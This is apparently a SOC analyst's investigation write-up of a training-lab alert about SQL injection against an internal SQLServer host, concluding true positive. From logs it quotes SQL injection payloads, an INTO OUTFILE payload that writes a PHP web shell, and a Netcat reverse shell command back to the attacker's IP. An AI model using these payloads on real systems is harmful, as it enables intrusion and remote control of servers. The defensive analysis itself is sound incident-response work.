# SOC142 - Multiple HTTP 500 Response

## 1. Alert Overview

- **Event ID:** 89
- **Alert Name:** SOC142 - Multiple HTTP 500 Response
- **Severity:** High
- **Timestamp:** 2021-04-18 13:00:27 UTC+03:00
- **Source IP:** `101.32.223.119`
- **Destination IP:** `172.16.20.6`
- **Destination Hostname:** `SQLServer`
- **Alert Type:** Proxy
- **Username:** `www-data`
- **Device Action:** Allowed

The alert detected multiple HTTP 500 responses generated during suspicious requests to the internal SQLServer host.

## 2. Investigation Findings

### 2.1. Analyze HTTP Requests

Log Management recorded several requests from `101.32.223.119` to `172.16.20.6:443` that returned HTTP 500 responses.

The requests included:

- `userNumber=1 AND (SELECT * FROM Users) = 1`
- `userNumber=-1 UNION SELECT 1 INTO @,@`
- `userNumber=' OR '' = '`
- `userNumber=AND true`

These payloads indicate attempts to manipulate SQL queries through the `userNumber` parameter. The repeated HTTP 500 responses are consistent with server-side errors triggered by the submitted inputs.

**Outcome:** Suspicious SQL injection activity identified.

### 2.2. Identify Successful SQL Injection Activity

Subsequent requests returned HTTP 200 responses, including:

- `userNumber=' union select 1, '' into outfile '/var/www/html/cmd.php' #`
- `/cmd.php?cmd=whoami`
- `/cmd.php?cmd=id`

The `INTO OUTFILE` payload attempted to write a PHP file named `cmd.php` into `/var/www/html/`. The subsequent requests to `cmd.php` used commands commonly associated with identifying the current execution user and inspecting its identity and privileges.

The HTTP 200 responses indicate successful HTTP responses, although the status code alone does not prove that every requested operation completed successfully. The sequence of requests supports the assessment that the attacker progressed beyond initial SQL injection testing and attempted to use a server-side PHP file to execute commands.

**Outcome:** SQL injection exploitation and attempted web shell activity identified.

### 2.3. Identify Command Execution and Remote Shell Activity

At 12:05:47, the proxy log recorded the following request:

`/cmd.php?cmd=nc 101.32.223.119 1234 -e /bin/sh`

This command attempts to use Netcat to connect back to `101.32.223.119` on port `1234` and attach a shell to the connection.

A firewall log at 12:05:33 also recorded traffic from `101.32.223.119:1234` to `172.16.20.6:1774`.

The firewall event is consistent with related network activity, but the available fields do not independently establish that a reverse shell was successfully established.

**Outcome:** Attempted remote shell activity identified.

### 2.4. Check IP and URL Reputation

The playbook classified the destination URL as **Malicious**.

The activity involved SQL injection payloads, an attempt to write a PHP file into the web directory, subsequent command-oriented requests, and an attempted Netcat shell connection.

**Outcome:** Malicious.

## 3. Playbook Execution

### Step 1: Check Whether the IP/URL/Domain Was Accessed

Log Management recorded requests from `101.32.223.119` to `172.16.20.6`, including multiple SQL injection payloads and subsequent requests to `/cmd.php`.

**Outcome:** Accessed.

### Step 2: Analyze the URL Address

The URL and associated activity were classified as malicious based on the observed exploitation attempts and command execution behavior.

**Outcome:** Malicious.

## 4. Final Verdict

**True Positive — SQL injection exploitation with attempted web shell and reverse shell activity.**

The evidence shows repeated SQL injection attempts against the `userNumber` parameter, followed by an attempt to write `cmd.php` into the web server directory. Subsequent requests attempted to execute system-identification commands and launch a Netcat-based shell connection. These findings support classifying the alert as a True Positive.
